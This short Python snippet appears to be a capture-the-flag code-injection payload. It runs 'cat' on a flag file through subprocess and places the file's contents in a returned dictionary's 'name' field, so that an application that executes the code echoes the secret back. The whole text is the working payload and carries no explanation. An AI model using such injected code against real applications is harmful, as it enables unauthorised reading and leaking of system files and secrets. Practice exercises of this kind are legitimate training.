
from subprocess import check_output
k = check_output('cat /flag_5fb2acebf1d0c558'.split())
k = "\n"+k.decode()+"\n"
RETURN = { 'name': k, 'age': 0 }
